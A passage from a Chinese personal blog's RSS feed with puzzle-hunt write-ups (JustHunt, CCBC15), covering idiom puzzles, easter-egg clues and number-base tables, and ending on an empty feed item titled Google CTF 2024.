unit”，然后猜了“克”，刚好是7划，结果不对，后来又猜会不会是多少克的单位，发现“两”也是7划，结果猜对了。看了解析，原来上面也是成语的英文翻译，不过是正确的翻译，但是问好的数量和实际单词长度不一致，非常误导。这些成语是：无米之炊，爱屋及乌，笨鸟先飞，烂醉如泥，拆东补西，糖衣炮弹，上面提取出来的是“two”，也是“两” 最后一个小题是彩色的，也是把前面所有题都综合了一下，应该是用下面给的字组成几个成语，得到了飞鸿雪泥，以德追祸，曾几何时，方圆殊趣，亡国之X，忐忑不安，以毒攻毒。上面四个字母是“horn”，对应7划的字“角”，下面三个字母是“gut”，对应8划的字“勇”，重合的5划“用”为最后答案 到了最后的总结题，发现每个小题答案的笔画数刚好对应上每个颜色的数字，还有一些扑克牌花色表示和矩形组合不知道是什么意思。尝试用小题答案找成语后，发现了规律，前面每个方块里的两个矩形分别代表字的拼音的声母韵母，颜色相同则拼音相同，那扑克牌花色就是四种声调，然后就得到了：心心相印，源源不断，不卑不亢，无拘无束，大敌当前，宝刀未老，两鬓斑白，意气用事。再把拼音组合起来得到四个字“宣布倒闭”，翻译成英文即可&#xA;隐藏菜单 一开始真的去小红书找餐馆了，虽然图片能搜到，但是饭店没找到。突破点就在2和4了，4总觉得是魂斗罗无敌的代码，2的机器人想了好久觉得可以试试安卓，结果一搜安卓的彩蛋发现安卓13的彩蛋就是要调整时间到下午一点触发，而且版本代号是提拉米苏，一个甜品。突然想到题目，原来题目也是隐藏彩蛋的谐音，这样其它的就好找多了。第一个是Adventure，第三个是google搜索askew，第五个是新版word输入=rand()，第六个是知乎。Adventure也让我想到了电影头号玩家，题目想法确实不错，就是提取排序没意思，硬用tag的长度来凑。看了解析后，原来图片里每个食物的数量也对应了easter egg</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
聚字成语
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>又是一个由8个小题组成的题目，每道题的颜色都不一样，最后所有颜色汇总成一个题。注意题目中的后两个字也暗示了本题的主题
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.8s3aeoeyaq.webp"/>
</figure>

第一个BNH很容易查到是“了”的五笔，然后发现这些句子去掉一个字都是成语：春梦（了）无痕，河东狮（子）吼，冰心（在）玉壶，口（有）蜜腹（有）剑，难能（而）可贵，绝无（而）仅有，绝世（而）独立，（不）怨天（不）尤人，怒发（上）冲冠，万籁（此）俱寂，沧海（之）一粟，视死（忽）如归，冰雪（净）聪明，花前（即）月下。把多的字的五笔编码都列出来刚好能对应上不同的蓝色，得到“印”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1hs73mofn9.webp"/>
</figure>

第二小题都是四个音调都包含的成语，那根据四个音调不同排列对应不同的字母，很容易想到康托排列，下面的成语提取出“used twice”，只有“不”字在这些成语中使用了两次
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.9rjdrujjtb.webp"/>
</figure>

三十六个字表示了九个成语，变成27个单词说明一个成语对应了三个单词，这些单词很奇怪，但翻译后可以尝试凑成一个意思类似的成语，如：赏心乐事，胡天胡地，俊采星驰，百感交集，望子成龙，心如死灰，牙牙学语，分形同气，三星高照。然后观察到每个单词都有一个字母红色放大，这些字母只有ACGU，三个一组一般用来表示氨基酸的密码子，对应一个字母，得到“pitch sing”，代表音高和唱，那和他俩再能组成成语的就是“亢”字了
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.45nzleg8x.webp"/>
</figure>

这个题题目里有一个成语，但是其中一个字换成了另一个同音字，还把这个改过的成语解释了一下，意思没变，那么下面应该也是一些有一个同音字的同意成语，分别为：口若悬河（核），毁方投圆（原），币重言（盐）甘，弹（蛋）丸之地，逐鹿（路）中原，从善如登（灯），萍（瓶）水相逢，刻（氪）舟求剑，乐而（儿）忘返，逝者如斯（思），祸（货）从天降，花天酒地（帝），再用数字提取得到“handle period”，二者组合得到“拘”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.2veq7o0ukz.webp"/>
</figure>

这个题开始没做出来，解析上说都是一些只有一个字差别的成语，如百无一堪/百无一漏/百无一是/百无一用，告/观/鉴/数往知来，一无所长/得/取/有/知，无所不包/可/能/通/为/在/至，一饭/壶/刻/诺/笑/掷/字千金，填进去后把红色字串起来得到“一往无前”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.4ckv9f5bjq.webp"/>
</figure>

这个题说了不是成语，而是四字词语，后面的数字代表了英文和拼音的长度，这些词分别是：罗曼蒂克，可口可乐，扑热息痛，阿弥陀佛，歇斯底里，盖世太保，普罗大众，提取后得到“not yet”，即为“未”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1aoz87492r.webp"/>
</figure>

这题我只做了黑色的部分，把单词填进去后，看起来都是一些成语的英文直译，提取出黑色的是“weight unit”，然后猜了“克”，刚好是7划，结果不对，后来又猜会不会是多少克的单位，发现“两”也是7划，结果猜对了。看了解析，原来上面也是成语的英文翻译，不过是正确的翻译，但是问好的数量和实际单词长度不一致，非常误导。这些成语是：无米之炊，爱屋及乌，笨鸟先飞，烂醉如泥，拆东补西，糖衣炮弹，上面提取出来的是“two”，也是“两”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1vymuhz09v.webp"/>
</figure>

最后一个小题是彩色的，也是把前面所有题都综合了一下，应该是用下面给的字组成几个成语，得到了飞鸿雪泥，以德追祸，曾几何时，方圆殊趣，亡国之X，忐忑不安，以毒攻毒。上面四个字母是“horn”，对应7划的字“角”，下面三个字母是“gut”，对应8划的字“勇”，重合的5划“用”为最后答案
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.45hndzk602.webp"/>
</figure>

到了最后的总结题，发现每个小题答案的笔画数刚好对应上每个颜色的数字，还有一些扑克牌花色表示和矩形组合不知道是什么意思。尝试用小题答案找成语后，发现了规律，前面每个方块里的两个矩形分别代表字的拼音的声母韵母，颜色相同则拼音相同，那扑克牌花色就是四种声调，然后就得到了：心心相印，源源不断，不卑不亢，无拘无束，大敌当前，宝刀未老，两鬓斑白，意气用事。再把拼音组合起来得到四个字“宣布倒闭”，翻译成英文即可</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
隐藏菜单
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.8z6igzzscf.webp"/>
</figure>

一开始真的去小红书找餐馆了，虽然图片能搜到，但是饭店没找到。突破点就在2和4了，4总觉得是魂斗罗无敌的代码，2的机器人想了好久觉得可以试试安卓，结果一搜安卓的彩蛋发现安卓13的彩蛋就是要调整时间到下午一点触发，而且版本代号是提拉米苏，一个甜品。突然想到题目，原来题目也是隐藏彩蛋的谐音，这样其它的就好找多了。第一个是Adventure，第三个是google搜索askew，第五个是新版word输入=rand()，第六个是知乎。Adventure也让我想到了电影头号玩家，题目想法确实不错，就是提取排序没意思，硬用tag的长度来凑。看了解析后，原来图片里每个食物的数量也对应了easter egg</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>JustHunt总结二</title>
      <link>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E4%BA%8C/</link>
      <pubDate>Tue, 24 Sep 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E4%BA%8C/</guid>
      <description>第18题 想想钟发出的声音，这题就很简单&#xA;第25题 图上的X 2X看起来像是倍数关系，跨栏联想到110米，那110的2倍220又与电源相关的，那就是220V。第三个指的是可乐的容量330mL，第四个是标准音调440Hz&#xA;春江花月夜 这道题有六个部分,五个小题和最后的综合。从题目来看应该和春江花月夜这首诗有关 第一个部分六个格子很容易想到是盲文，特别注意其一的其中间也被涂黑了，也暗示了盲文，后面小题的题目也都有这种暗示。根据标点和字找出对应的诗句，再看有没有包含后面的文字，可以推出答案。另外还要注意要把英文单词翻译成一个汉字，笔画数也能对得上，本小题为rice对应“米” 第二个小题的“二”下面画了横线，猜测和二进制有关。但是H是第八个字母，0b1000对不上前面的句子，再注意观察春江花月夜出现的位置，上下两句都是7个字都对应了H，那猜测是ASCII码。最后得出来scry对应“占” 第三题只写了“孤篇盖全唐”和用了约等于，上面的诗句也不是春江花月夜里的了，应该是要找相似的句子，Z是指是相似的句子在第26句话。最后得出virtuous对应“良” 第四题的“其”写错了，那应该和旗语有关，但是观察诗句特点只能找到季节和颜色，不知道要怎么对应。解析上说是春夏秋冬 = 东南西北 = 青红白黑，其中颜色对应五行的方位，得到doom对应“厄” 第五题有个I/J，“棋五”也很明显，说明是棋盘密码，通过春江花月夜出现的位置变成坐标来提取就行了，得到each对应“各” 最后的两部分答案里说要用《红楼梦》中摹拟《春江花月夜》所做的《秋窗风雨夕》重新做一遍五个题，这用梦里和平行世界有点太难找了。重新做后得到kisser，对应汉字“口”，那下面六个就是每个汉字都加上口字旁，然后组成的汉字提取出拼音，得到最终答案MICHELANGELO</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
第18题
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.4n7oh87dfd.webp"/>
</figure>

想想钟发出的声音，这题就很简单</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
第25题
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.3d4rc97530.webp"/>
</figure>

图上的X 2X看起来像是倍数关系，跨栏联想到110米，那110的2倍220又与电源相关的，那就是220V。第三个指的是可乐的容量330mL，第四个是标准音调440Hz</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-2">
<h2 id="headline-3">
春江花月夜
</h2>
<div id="outline-text-headline-3" class="outline-text-2">
<p>这道题有六个部分,五个小题和最后的综合。从题目来看应该和春江花月夜这首诗有关
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.2yybr17uca.webp"/>
</figure>

第一个部分六个格子很容易想到是盲文，特别注意其一的其中间也被涂黑了，也暗示了盲文，后面小题的题目也都有这种暗示。根据标点和字找出对应的诗句，再看有没有包含后面的文字，可以推出答案。另外还要注意要把英文单词翻译成一个汉字，笔画数也能对得上，本小题为rice对应“米”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.6m3vektdis.webp"/>
</figure>

第二个小题的“二”下面画了横线，猜测和二进制有关。但是H是第八个字母，0b1000对不上前面的句子，再注意观察春江花月夜出现的位置，上下两句都是7个字都对应了H，那猜测是ASCII码。最后得出来scry对应“占”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.4uawjpg47p.webp"/>
</figure>

第三题只写了“孤篇盖全唐”和用了约等于，上面的诗句也不是春江花月夜里的了，应该是要找相似的句子，Z是指是相似的句子在第26句话。最后得出virtuous对应“良”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.67xfnuphxk.webp"/>
</figure>

第四题的“其”写错了，那应该和旗语有关，但是观察诗句特点只能找到季节和颜色，不知道要怎么对应。解析上说是春夏秋冬 = 东南西北 = 青红白黑，其中颜色对应五行的方位，得到doom对应“厄”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1aoyu14iwm.webp"/>
</figure>

第五题有个I/J，“棋五”也很明显，说明是棋盘密码，通过春江花月夜出现的位置变成坐标来提取就行了，得到each对应“各”
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.54xqczn5pl.webp"/>
</figure>

<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1e8krqywbt.webp"/>
</figure>

最后的两部分答案里说要用《红楼梦》中摹拟《春江花月夜》所做的《秋窗风雨夕》重新做一遍五个题，这用梦里和平行世界有点太难找了。重新做后得到kisser，对应汉字“口”，那下面六个就是每个汉字都加上口字旁，然后组成的汉字提取出拼音，得到最终答案MICHELANGELO</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>JustHunt总结一</title>
      <link>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E4%B8%80/</link>
      <pubDate>Mon, 23 Sep 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E4%B8%80/</guid>
      <description>简介 CCBC后的又一个hunt，由上海交大的同学组织的，Just也对应了大学的名称。这次的题目开始挺有趣，难度也不高，学到了很多新知识。但是做到一半后突然变难，很多都不想做，前后差异很大。最后的结尾还是日语主题，很不顺地做完后并没有什么激动的心情，属于是虎头蛇尾了 第1题 有好多emoji，但是不知道代表了什么字或者词。不过那个红黄的方块提示很明显，特别是做过七日谈的话，加上唐老鸭的英文，合到一起代表的就是麦当劳了。那右边四个就是麦当劳的四种吃的，而且都以麦开头，填入对应英文得到答案&#xA;第2题 第一眼看去好像要提取四个字的拼音，特别是“颂”的拼音很给人误导，而且关键的地方被墨水盖住了。但是提取后得不到单词，那就换一种思路，song当作英文单词也和“颂”的意思可以对的上，把其它的也翻译成英文单词并提取，得到答案&#xA;第6题 又是一个很容易被误导的题，看到一些元素名称就去查元素周期表，但是中间加的数字一直没搞清楚什么作用。还是队友从戒指推出了是婚姻纪念日的别称，比如银婚、金婚、白金婚，再提取对应单词就行&#xA;第10题 一堆不同长度的色块，不知道要填什么。左边还都有小于号，而右边只有p和f两个字母。开始想到乐谱上的强弱符号，但感觉不是，后来查了下英文，发现确实可以对上，于是解决&#xA;第13题 思路就是如何把A、N和三个方块相对应，想了很久，想到只有笔画是三划，那不同的颜色就表示不同笔画，推出其它颜色代表的笔画然后得出字母是什么&#xA;第17题 有很多的方块和圆圈，非常乱找不到思路。尝试从数字入手，34可能是中国的省份数量，用方块表示，而26最有可能是字母个数，用圆圈表示，那两个结合的话最有可能是车牌。再看下面第一行，苏州的小伙伴肯定都很熟悉，苏州的车牌同时用了“苏E”和“苏U”，最后一个从A到Z都用了的是广东省，大概就能推出答案了。看了解析后，了解了-3指去掉港澳台，-1指字母I没有用在车牌里，CW指的是顺时针，福建省的车牌字母顺序是按顺时针分配的，还有个别省警车专用字母O的车牌。</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
简介
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>CCBC后的又一个hunt，由上海交大的同学组织的，Just也对应了大学的名称。这次的题目开始挺有趣，难度也不高，学到了很多新知识。但是做到一半后突然变难，很多都不想做，前后差异很大。最后的结尾还是日语主题，很不顺地做完后并没有什么激动的心情，属于是虎头蛇尾了
<figure><img src="https://wind1900.github.io/picx-images-hosting/justhunt.9dcxdyacv0.webp"/>
</figure>
</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
第1题
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.7zqea6vj26.webp"/>
</figure>

有好多emoji，但是不知道代表了什么字或者词。不过那个红黄的方块提示很明显，特别是做过七日谈的话，加上唐老鸭的英文，合到一起代表的就是麦当劳了。那右边四个就是麦当劳的四种吃的，而且都以麦开头，填入对应英文得到答案</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-2">
<h2 id="headline-3">
第2题
</h2>
<div id="outline-text-headline-3" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.1sf0bb99yj.webp"/>
</figure>

第一眼看去好像要提取四个字的拼音，特别是“颂”的拼音很给人误导，而且关键的地方被墨水盖住了。但是提取后得不到单词，那就换一种思路，song当作英文单词也和“颂”的意思可以对的上，把其它的也翻译成英文单词并提取，得到答案</p>
</div>
</div>
<div id="outline-container-headline-4" class="outline-2">
<h2 id="headline-4">
第6题
</h2>
<div id="outline-text-headline-4" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.8ad84n3hi3.webp"/>
</figure>

又是一个很容易被误导的题，看到一些元素名称就去查元素周期表，但是中间加的数字一直没搞清楚什么作用。还是队友从戒指推出了是婚姻纪念日的别称，比如银婚、金婚、白金婚，再提取对应单词就行</p>
</div>
</div>
<div id="outline-container-headline-5" class="outline-2">
<h2 id="headline-5">
第10题
</h2>
<div id="outline-text-headline-5" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.lvp2qgix7.webp"/>
</figure>

一堆不同长度的色块，不知道要填什么。左边还都有小于号，而右边只有p和f两个字母。开始想到乐谱上的强弱符号，但感觉不是，后来查了下英文，发现确实可以对上，于是解决</p>
</div>
</div>
<div id="outline-container-headline-6" class="outline-2">
<h2 id="headline-6">
第13题
</h2>
<div id="outline-text-headline-6" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.9kg5azko2m.webp"/>
</figure>

思路就是如何把A、N和三个方块相对应，想了很久，想到只有笔画是三划，那不同的颜色就表示不同笔画，推出其它颜色代表的笔画然后得出字母是什么</p>
</div>
</div>
<div id="outline-container-headline-7" class="outline-2">
<h2 id="headline-7">
第17题
</h2>
<div id="outline-text-headline-7" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.9kg5azyhvc.webp"/>
</figure>

有很多的方块和圆圈，非常乱找不到思路。尝试从数字入手，34可能是中国的省份数量，用方块表示，而26最有可能是字母个数，用圆圈表示，那两个结合的话最有可能是车牌。再看下面第一行，苏州的小伙伴肯定都很熟悉，苏州的车牌同时用了“苏E”和“苏U”，最后一个从A到Z都用了的是广东省，大概就能推出答案了。看了解析后，了解了-3指去掉港澳台，-1指字母I没有用在车牌里，CW指的是顺时针，福建省的车牌字母顺序是按顺时针分配的，还有个别省警车专用字母O的车牌。</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>CCBC15总结2</title>
      <link>https://wind1900.github.io/puzzlehunt/ccbc15%E6%80%BB%E7%BB%932/</link>
      <pubDate>Wed, 21 Aug 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/ccbc15%E6%80%BB%E7%BB%932/</guid>
      <description>update 又看了一眼排名，变成87了&#xA;囚于？？？的七日谈 这个题算是一个比较有意思的题，但是提取设计的不是很好: 小白狐差点被这些过期了整整一个月的盗版免费吃快餐奖券的循环困住了，幸好他还记得原版题目和答案，从那些长度没变的答案里找到不变的那些东西逃掉了。 一开始以为和PKU有关系，但是那个只到了第三日。开了提示后才知道主题是麦当劳的活动。麦当劳在7月推出了一周免费鸡翅的谜题活动，而图上的这些都是根据麦当劳谜题修改过的。红色的框里是本题答案，蓝色框里是另一道题的答案拿过来当题目。被循环困住指的是答案红框和题目蓝框的关系刚好成一个环。&#xA;麦当劳的这个题看看还是很不错的，新题就不多讲了。&#xA;第一日 第二日 第三日 第四日 第五日 第六日 第七日 第七日的解法是数每个数字亮的数码管的个数。</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
update
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>又看了一眼排名，变成87了</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
囚于？？？的七日谈
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>这个题算是一个比较有意思的题，但是提取设计的不是很好:
小白狐差点被这些过期了整整一个月的盗版免费吃快餐奖券的循环困住了，幸好他还记得原版题目和答案，从那些长度没变的答案里找到不变的那些东西逃掉了。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.8ad6s3kpqo.webp"/>
</figure>

一开始以为和PKU有关系，但是那个只到了第三日。开了提示后才知道主题是麦当劳的活动。麦当劳在7月推出了一周免费鸡翅的谜题活动，而图上的这些都是根据麦当劳谜题修改过的。红色的框里是本题答案，蓝色框里是另一道题的答案拿过来当题目。被循环困住指的是答案红框和题目蓝框的关系刚好成一个环。<br>
麦当劳的这个题看看还是很不错的，新题就不多讲了。<br>
第一日
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.b8tx50htp.webp"/>
</figure>

第二日
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.60u68q0mbd.webp"/>
</figure>

第三日
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.8z6gc89yie.webp"/>
</figure>

第四日
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1lbr3gqiwg.webp"/>
</figure>

第五日
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.2doml77mnm.webp"/>
</figure>

第六日
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.9gwi0tdha9.webp"/>
</figure>

第七日
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.5c0wopgyo1.webp"/>
</figure>

第七日的解法是数每个数字亮的数码管的个数。</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>CCBC15总结1</title>
      <link>https://wind1900.github.io/puzzlehunt/ccbc15%E6%80%BB%E7%BB%931/</link>
      <pubDate>Mon, 19 Aug 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/ccbc15%E6%80%BB%E7%BB%931/</guid>
      <description>简介 一年一度的CCBC又到了，今年不再孤军奋战，并且完成了小目标：前100名成功完赛。 有了队友大家一起想问题思路会更多，在一起讨论也会很开心。 本来是92名的，结果前面有几个作弊队伍被抓出来变成了88名。下图是解题时间统计。 镜中何物 前面几个区的题都挺简单，直接从第三个区开始讲起。 首先左边的字母连起来读，会得到三个单词shadow，pigpen，semaphore，后面两个代表猪圈密码和旗语，第一个没有想出来。现在知道了第一个也是一个和旗语很像的密码，更熟悉的名称是Chain of Death，发表在Shadow杂志上。&#xA;之后注意到名字左边还对应了0、1、2，字母都是3个一组的，猜测到应该是转成三位三进制数，然后再变成对应的第几个字母。&#xA;至于怎么转，应该还是和镜面有关。每个字母在这三种密码中都是一个图形，图形在镜子中的倒影则对应了另一个字母的密码，找到用的哪种密码，就可以变成数字了。&#xA;北京人儿到纽约 这道题一看就和儿话音有关，但是题目里只有一些词，并没有其他提示，需要自己找到联系。&#xA;一个尝试就是把每个词翻译成英文后，后面加上er。发现它们会变成新的词汇，其中“是”这个有点难，想了很久才发现要用be。之后又发现这些词可以两两一组，暗示了一个东西，而这个东西就是填空需要的词。&#xA;屁股 butter 是 beer Harry Potter 关 offer 关心 career interview 玉米 corner 分 center position 宠物 peter 公园 parker spider man 这时候会发现，英文填空的地方*代表的也是er，这道题的主题果然就是er。之后按照字母提取得到&amp;#34;vyimportantpson&amp;#34;，这里也少了两个er，补充后得到&amp;#34;very important person&amp;#34;，但是提交不正确。后来队友想到了它们有个缩写是VIP，而vip加上er也能凑出新单词，正确答案就这样出来了。&#xA;算算看吧 这道题给了很多算式和结果，很明显需要用不同进制使算式成立。然后注意只需要从二进制检查到26进制就行，因为只有26个字母。&#xA;算式 答案 进制 十进制结果 字母 12-0.22-0.02 11.1 4 5.25 d 357-345.670.02 11.2 9 10.222 i 88÷8+222÷888 11.49 18 19.25 r (10-1)x10 40 5 20 e (2000-1)÷10+10 202.2 3 20.</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
简介
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>一年一度的CCBC又到了，今年不再孤军奋战，并且完成了小目标：前100名成功完赛。
有了队友大家一起想问题思路会更多，在一起讨论也会很开心。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.3rb5lpsr9t.webp"/>
</figure>

本来是92名的，结果前面有几个作弊队伍被抓出来变成了88名。下图是解题时间统计。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.7ax3bsk6cr.webp"/>
</figure>
</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
镜中何物
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>前面几个区的题都挺简单，直接从第三个区开始讲起。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.7egp9igahd.webp"/>
</figure>

首先左边的字母连起来读，会得到三个单词shadow，pigpen，semaphore，后面两个代表猪圈密码和旗语，第一个没有想出来。现在知道了第一个也是一个和旗语很像的密码，更熟悉的名称是Chain of Death，发表在<a href="https://www.apprendre-en-ligne.net/crypto/bibliotheque/shadow/shadow340715.pdf">Shadow</a>杂志上。<br>
之后注意到名字左边还对应了0、1、2，字母都是3个一组的，猜测到应该是转成三位三进制数，然后再变成对应的第几个字母。<br>
至于怎么转，应该还是和镜面有关。每个字母在这三种密码中都是一个图形，图形在镜子中的倒影则对应了另一个字母的密码，找到用的哪种密码，就可以变成数字了。</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-2">
<h2 id="headline-3">
北京人儿到纽约
</h2>
<div id="outline-text-headline-3" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.8hgeko7joc.webp"/>
</figure>

这道题一看就和儿话音有关，但是题目里只有一些词，并没有其他提示，需要自己找到联系。<br>
一个尝试就是把每个词翻译成英文后，后面加上er。发现它们会变成新的词汇，其中“是”这个有点难，想了很久才发现要用be。之后又发现这些词可以两两一组，暗示了一个东西，而这个东西就是填空需要的词。</p>
<table>
<tbody>
<tr>
<td>屁股</td>
<td>butter</td>
<td>是</td>
<td>beer</td>
<td>Harry Potter</td>
</tr>
<tr>
<td>关</td>
<td>offer</td>
<td>关心</td>
<td>career</td>
<td>interview</td>
</tr>
<tr>
<td>玉米</td>
<td>corner</td>
<td>分</td>
<td>center</td>
<td>position</td>
</tr>
<tr>
<td>宠物</td>
<td>peter</td>
<td>公园</td>
<td>parker</td>
<td>spider man</td>
</tr>
</tbody>
</table>
<p>
这时候会发现，英文填空的地方*代表的也是er，这道题的主题果然就是er。之后按照字母提取得到&#34;vyimportantpson&#34;，这里也少了两个er，补充后得到&#34;very important person&#34;，但是提交不正确。后来队友想到了它们有个缩写是VIP，而vip加上er也能凑出新单词，正确答案就这样出来了。</p>
</div>
</div>
<div id="outline-container-headline-4" class="outline-2">
<h2 id="headline-4">
算算看吧
</h2>
<div id="outline-text-headline-4" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.60u65u4asx.webp"/>
</figure>

这道题给了很多算式和结果，很明显需要用不同进制使算式成立。然后注意只需要从二进制检查到26进制就行，因为只有26个字母。</p>
<table>
<thead>
<tr>
<th>算式</th>
<th class="align-right">答案</th>
<th class="align-right">进制</th>
<th class="align-right">十进制结果</th>
<th>字母</th>
</tr>
</thead>
<tbody>
<tr>
<td>12-0.22-0.02</td>
<td class="align-right">11.1</td>
<td class="align-right">4</td>
<td class="align-right">5.25</td>
<td>d</td>
</tr>
<tr>
<td>357-345.670.02</td>
<td class="align-right">11.2</td>
<td class="align-right">9</td>
<td class="align-right">10.222</td>
<td>i</td>
</tr>
<tr>
<td>88÷8+222÷888</td>
<td class="align-right">11.49</td>
<td class="align-right">18</td>
<td class="align-right">19.25</td>
<td>r</td>
</tr>
<tr>
<td>(10-1)x10</td>
<td class="align-right">40</td>
<td class="align-right">5</td>
<td class="align-right">20</td>
<td>e</td>
</tr>
<tr>
<td>(2000-1)÷10+10</td>
<td class="align-right">202.2</td>
<td class="align-right">3</td>
<td class="align-right">20.667</td>
<td>c</td>
</tr>
<tr>
<td>66÷5.5-3</td>
<td class="align-right">11</td>
<td class="align-right">20</td>
<td class="align-right">21</td>
<td>t</td>
</tr>
<tr>
<td>6^2</td>
<td class="align-right">26</td>
<td class="align-right">15</td>
<td class="align-right">36</td>
<td>o</td>
</tr>
<tr>
<td>4x9+1</td>
<td class="align-right">21</td>
<td class="align-right">18</td>
<td class="align-right">37</td>
<td>r</td>
</tr>
<tr>
<td>9x9+13</td>
<td class="align-right">15</td>
<td class="align-right">15</td>
<td class="align-right">99</td>
<td>o</td>
</tr>
<tr>
<td>532÷2</td>
<td class="align-right">244</td>
<td class="align-right">6</td>
<td class="align-right">100</td>
<td>f</td>
</tr>
<tr>
<td>2^7</td>
<td class="align-right">68</td>
<td class="align-right">20</td>
<td class="align-right">128</td>
<td>t</td>
</tr>
<tr>
<td>1000+(3x2-1)^2</td>
<td class="align-right">1100</td>
<td class="align-right">5</td>
<td class="align-right">150</td>
<td>e</td>
</tr>
<tr>
<td>245÷2</td>
<td class="align-right">122.7</td>
<td class="align-right">14</td>
<td class="align-right">226.5</td>
<td>n</td>
</tr>
<tr>
<td>3^10</td>
<td class="align-right">1433</td>
<td class="align-right">5</td>
<td class="align-right">243</td>
<td>e</td>
</tr>
<tr>
<td>491÷4</td>
<td class="align-right">125.5</td>
<td class="align-right">20</td>
<td class="align-right">445.25</td>
<td>t</td>
</tr>
</tbody>
</table>
<p>
很可惜计算的时候算错一个，始终没提取出答案。后来又检查一遍才算对。</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Google CTF 2024</title>
      <link>https://wind1900.github.io/ctf/google_ctf_2024/</link>
      <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/ctf/google_ctf_2024/</guid>
